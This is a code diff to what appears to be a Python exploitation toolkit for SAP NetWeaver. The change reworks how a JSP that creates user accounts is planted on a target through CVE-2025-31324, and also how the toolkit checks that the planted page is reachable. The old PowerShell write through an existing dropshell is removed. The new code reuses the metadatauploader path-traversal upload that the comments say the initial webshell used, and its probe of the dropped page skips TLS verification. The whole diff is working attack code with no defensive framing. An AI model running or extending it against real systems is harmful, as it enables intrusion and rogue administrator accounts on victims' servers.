@@ -485,39 +485,78 @@ def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
 # Deployment path 1: via CVE-2025-31324 (existing dropshell)
 # ---------------------------------------------------------------------------
 
-def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
-    """Drop the create-user JSP via CVE-2025-31324 command-write.
+def deploy_create_user_jsp_via_cve_31324(node, writer_fn=None) -> dict:
+    """Drop the create-user JSP via CVE-2025-31324 metadatauploader.
 
-    `writer_fn` is a callable that takes a single shell-command string and
-    executes it on the target (typically
-    `sapmap_exploit.execute_cve_2025_31324_via_shell` or a wrapper).
+    Re-uses the same ZIP path-traversal write that the initial webshell used
+    (relative path ``../apps/sap.com/irj/servlet_jsp/irj/root/<name>``,
+    resolved by the running deserialiser against its real app root).  The
+    old approach — writing to a guessed absolute path via an existing shell
+    — failed on systems where the runtime instance directory differs from
+    ``J<nr>`` (shared mounts, JC<nr>, non-default drive), so we skip that
+    route entirely.
 
-    Returns dict: {success, jsp_url, jsp_name, error}.
+    ``writer_fn`` is accepted and ignored for backwards-compatibility with
+    the previous signature.
+
+    Returns dict: {success, jsp_url, jsp_name, error, method}.
     """
+    _ = writer_fn  # unused (kept for API compatibility)
     sid = node.sid
     port = getattr(node, "cve_2025_31324_port", 0)
     if not port or port < 50000:
         return {"success": False, "error": "no Java HTTP port known"}
-    inst_nr = (port - 50000) // 100
-    jsp_name = _random_jsp_name("ume")
-    target_path = _java_root_path(sid, inst_nr) + "\\" + jsp_name
-    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
 
-    ps_cmd = (f"[IO.File]::WriteAllBytes('{target_path}',"
-              f"[Convert]::FromBase64String('{jsp_b64}'))")
-    full = f"powershell.exe -NoProfile -Command {ps_cmd}"
     try:
-        r = writer_fn(full)
+        from sap_cve_2025_31324 import exploit_cve_2025_31324_dropshell
     except Exception as e:
-        return {"success": False, "error": f"writer failed: {e}"}
-    if not r.get("success"):
-        return {"success": False, "error": r.get("error", "write failed")}
+        return {"success": False,
+                "error": f"sap_cve_2025_31324 module not importable: {e}"}
 
-    scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
     host = node.ip or node.hostname
-    jsp_url = f"{scheme}://{host}:{port}/irj/{jsp_name}"
+    https = bool(getattr(node, "cve_2025_31324_https", False))
+    jsp_name = _random_jsp_name("ume")
+
+    drop = exploit_cve_2025_31324_dropshell(
+        host=host, port=port, use_https=https,
+        shell_name=jsp_name, jsp_content=UME_CREATE_JSP, timeout=20.0)
+    if not drop.get("success"):
+        return {"success": False,
+                "error": (f"metadatauploader drop failed: "
+                          f"HTTP {drop.get('http_status')} — "
+                          f"{drop.get('evidence', '?')}"),
+                "http_status": drop.get("http_status", 0)}
+
+    jsp_url = drop.get("shell_url") or \
+              f"{'https' if https else 'http'}://{host}:{port}/irj/{jsp_name}"
+
+    # Post-drop reachability probe: the JSP compiles on first request, so a
+    # GET without args should return HTTP 200 with an empty body (our JSP
+    # prints nothing until ?action=…).  404 here means the drop landed in
+    # the wrong place — surface that immediately rather than failing later
+    # during the real invocation.
+    try:
+        ctx = ssl._create_unverified_context()
+        req = urllib.request.Request(jsp_url, headers={"User-Agent": _UA})
+        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
+            probe_status = r.status
+    except urllib.error.HTTPError as e:
+        probe_status = e.code
+    except (urllib.error.URLError, TimeoutError, OSError) as e:
+        return {"success": False,
+                "error": f"JSP deployed but unreachable: {e}",
+                "jsp_url": jsp_url}
+    if probe_status == 404:
+        return {"success": False,
+                "error": (f"JSP deployed but GET {jsp_url} returned 404 — "
+                          f"metadatauploader write did not land in the "
+                          f"served irj/root (possibly a non-default cluster "
+                          f"layout)"),
+                "jsp_url": jsp_url}
+
     return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
-            "target_path": target_path, "method": "cve_31324"}
+            "target_path": "(metadatauploader-relative)",
+            "method": "cve_31324", "used_uid": drop.get("used_uid", "")}
 
 
 # ---------------------------------------------------------------------------
